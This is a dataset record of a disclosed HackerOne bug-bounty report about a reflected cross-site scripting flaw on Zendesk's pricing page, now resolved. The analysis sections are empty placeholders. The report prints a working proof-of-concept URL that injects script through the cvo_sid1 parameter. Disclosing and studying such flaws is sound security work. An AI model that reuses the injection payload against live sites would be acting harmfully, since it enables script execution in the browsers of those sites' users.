---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '89624'
original_report_id: '89624'
title: Cross-site Scripting https://www.zendesk.com/product/pricing/
weakness: Cross-site Scripting (XSS) - Generic
team_handle: zendesk
created_at: '2015-09-19T11:48:48.895Z'
disclosed_at: '2015-12-09T02:06:13.759Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Cross-site Scripting https://www.zendesk.com/product/pricing/

## Metadata

- HackerOne Report ID: 89624
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: zendesk
- Disclosed At: 2015-12-09T02:06:13.759Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello.
https://www.zendesk.com/product/pricing/#?cvo_sid1=%22/alert%28%221%22%29/%22
This XSS can be done on most pages of this site.
Vulnerable param is cvo_sid1. For the XSS i used "/alert("1")/"
Tested in Mozilla Firefox

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
